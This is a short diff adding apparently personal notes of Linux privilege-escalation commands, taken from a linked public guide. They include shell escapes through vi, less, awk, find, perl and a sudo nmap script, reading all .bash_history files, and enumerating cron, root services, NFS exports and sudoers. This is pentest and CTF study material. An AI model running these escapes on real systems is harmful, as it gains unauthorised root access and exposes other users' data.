@@ -1,0 +1,39 @@
+linux privesc commands
+
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+find -name ".bash_history" -exec cat {} \;
+
+Common Shell Escape Sequences:
+Command	Program(s)
+:!bash	vi, vim
+:set shell=/bin/bash:shell	vi, vim
+!bash	man, more, less
+find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ; 	find
+awk 'BEGIN {system("/bin/bash")}'	awk
+--interactive	nmap
+echo "os.execute('/bin/sh')" > exploit.nse
+sudo nmap --script=exploit.nse	nmap (thanks to comment by anonymous below)
+perl -e 'exec "/bin/bash";'	Perl
+
+Jobs/Tasks:
+
+Command	Result
+crontab -l -u %username%	Display scheduled jobs for the specified user – Privileged command
+ls -la /etc/cron*	Scheduled jobs overview (hourly, daily, monthly etc)
+ls -aRl /etc/cron* | awk '$1 ~ /w.$/' 2>/dev/null	What can ‘others’ write in /etc/cron* directories
+top	List of current tasks
+
+Service Information:
+
+Command	Result
+ps aux | grep root	View services running as root
+ps aux | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++'	Lookup process binary path and permissions
+cat /etc/inetd.conf	List services managed by inetd
+cat /etc/xinetd.conf	As above for xinetd
+cat /etc/xinetd.conf 2>/dev/null | awk '{print $7}' |xargs -r ls -la 2>/dev/null	A very ‘rough’ command to extract associated binaries from xinetd.conf and show permissions of each
+ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null	Permissions and contents of /etc/exports (NFS)
+
+
+sudo -l
+cat /etc/sudoers
